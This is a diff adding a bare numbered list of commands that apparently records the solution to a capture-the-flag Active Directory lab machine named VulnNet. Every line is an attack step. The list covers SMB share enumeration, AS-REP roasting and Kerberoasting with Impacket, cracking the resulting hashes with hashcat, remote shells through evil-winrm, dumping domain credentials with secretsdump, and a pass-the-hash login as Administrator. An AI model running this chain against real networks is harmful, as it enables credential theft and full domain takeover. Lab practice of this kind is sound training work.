@@ -1,0 +1,15 @@
+1 - nmap -A 10.10.123.70
+2 - smbclient -L \\10.10.123.70
+3 - smbclient \\\\10.10.123.70\\VulnNet-Business-Anonymous
+4 - smbclient \\\\10.10.123.70\\VulnNet-Enterprise-Anonymous
+5 - python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.123.70 -usersfile users.txt -no-pass -request -outputfile kerberos-result
+6 - hashcat -m 18200 kerberos_result /usr/share/wordlists/rockyou.txt
+7 - python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid:<password> -dc-ip 10.10.123.70 -request -o kerberos_result2
+8 - hashcat -m 13100 kerberos_result2 /usr/share/wordlists/rockyou.txt
+9 - evil-winrm -i 10.10.123.70 -u 'enterprise-core-vn' -p '<password>'
+10 - type C:\Users\enterprise-core-vn\Desktop\user.txt
+11 - smbclient -L \\10.10.123.70
+12 - smbclient \\\\10.10.123.70\\SYSVOL -U enterprise-core-vn
+13 - python3 /usr/share/doc/python3-impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:<password>@10.10.123.70
+14 - evil-winrm -i 10.10.123.70 -u Administrator -H <HASH>
+15 - type C:\Users\Administrator\Desktop\system.txt
